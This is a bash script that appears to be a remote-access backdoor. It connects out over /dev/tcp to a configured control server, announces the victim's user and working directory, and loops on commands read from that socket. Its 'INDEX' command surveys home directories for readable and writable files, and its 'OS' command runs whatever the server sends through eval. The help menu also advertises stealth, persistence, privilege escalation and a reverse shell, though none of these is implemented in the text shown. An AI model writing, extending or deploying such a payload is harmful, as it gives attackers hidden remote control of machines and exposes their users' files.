#!/bin/bash
logserver=(
    '' #IP
    '' #PORT
)
shellserver=(
    '0.0.0.0' #IP
    '8080'    #PORT
)
declare -A logs

function log() {
    local Date="$(date)"
    local text="${1}"
    logs+=(["${Date}"]="${text}")

}
function write() {
    local text="${1}"
    echo -e "${text}" >&4
}
function connectionkill() {
    exec 4>&-
    exec 4<&-
}
function connect() {
    { exec 4<>/dev/tcp/"${shellserver[0]}"/"${shellserver[1]}"; } >/dev/null 2>&1 || {
        exit 255
    } && {
        log "Connection made"
        write "Connection made, You are $(whoami), located at $(pwd), with a task ID of ${BASHPID}, version ${BASH_VERSION}"
        write "Type: 'help' to get started"
        return 0
    }
}
if connect; then
    ISCONNECTED=true
fi
while $ISCONNECTED; do
    read -r command <&4
    case "${command^^}" in
    HELP) # ●
        write "\e[38;2;255;0;255m[●]\e[m: whoami : check user that payload is running at"
        write "\e[38;2;255;0;255m[●]\e[m: stealth : attemp to make payload stealthy"
        write "\e[38;2;255;0;255m[●]\e[m: index : attemp to index the machine"
        write "\e[38;2;255;0;255m[●]\e[m: persist : attemp multiple way's of persistance"
        write "\e[38;2;255;0;255m[●]\e[m: shell : open a reverse shell"
        write "\e[38;2;255;0;255m[●]\e[m: privesc : attemp to privelage escalate"
        write "\e[38;2;255;0;255m[●]\e[m: os : run command on system"
        ;;
    INDEX)
        write "\e[38;2;255;255;0m[Indexer]\e[m: Starting Indexer..."
        for a in /home/*; do
            write "\e[38;2;255;255;0m[Indexer]\e[m: Found possible user : ${a}"
            systemusers+=("${a}")
        done
        for a in "${systemusers[@]}"; do
            if [[ -r "${a}" ]]; then
                write "\e[38;2;255;255;0m[Indexer]\e[m: ${a} is readable saving for later check..."
                readableusers+=("${a}")
            else
                write "\e[38;2;255;255;0m[Indexer]\e[m: ${a} is blocked discarting..."
            fi
        done
        for a in "${readableusers[@]}"; do
            for b in "${a}"/*; do
                if [[ -d "${b}" ]]; then
                    dirs+=("${b}")
                    write "\e[38;2;255;0;255m[●]\e[m: ${b}"
                else
                    if [[ -w "${b}" && -r "${b}" ]]; then
                        write "\e[38;2;0;255;0m[●]\e[m: ${b}"

                    elif [[ -w "${b}" ]]; then
                        write "\e[38;2;0;255;255;0m[●]\e[m: ${b}"

                    elif [[ -r "${b}" ]]; then
                        write "\e[38;2;0;255;255;0m[●]\e[m: ${b}"
                    else
                        write "\e[38;2;255;0;0m[●]\e[m: ${b}"
                    fi
                fi

                # if [[ -w "${b}" && -r "$b}" ]]; then
                #     write "\e[38;2;255;255;0m[Indexer]\e[m: Found ${b} [Writeable/Readable]"
                # elif [[ -w "${b}" ]]; then

                # fi
                # if [[ -r "${b}" ]]; then
                #     write "\e[38;2;255;255;0m[Indexer]\e[m: Found ${b} [Reable]"
                # fi
            done
        done
        for a in "${dirs[@]}"; do
                    for b in "${a}"/*; do
                        if [[ -d "${b}" ]]; then
                            write "\e[38;2;255;0;255m[●]\e[m: ${b}"
                        else
                            if [[ -w "${b}" && -r "${b}" ]]; then
                                write "\e[38;2;0;255;0m[●]\e[m: ${b}"

                            elif [[ -w "${b}" ]]; then
                                write "\e[38;2;0;255;255;0m[●]\e[m: ${b}"

                            elif [[ -r "${b}" ]]; then
                                write "\e[38;2;0;255;255;0m[●]\e[m: ${b}"
                            else
                                write "\e[38;2;255;0;0m[●]\e[m: ${b}"
                            fi
                        fi
                    done
                done
        ;;
    OS)
        write "\e[38;2;255;0;255m[OS]\e[m: enter command to run"
        read -r runthis <&4
        write "> $(eval "${runthis}")"
        write "<Done!>"
        ;;
    WHOAMI)
        write "\e[38;2;255;0;255m[os]\e[m: $(whoami) : $(groups)"
        ;;
    CLEAR)
        clear
        ;;
    EXIT)
        write "bye!"
        connectionkill
        exit 0
        ;;
    esac
done
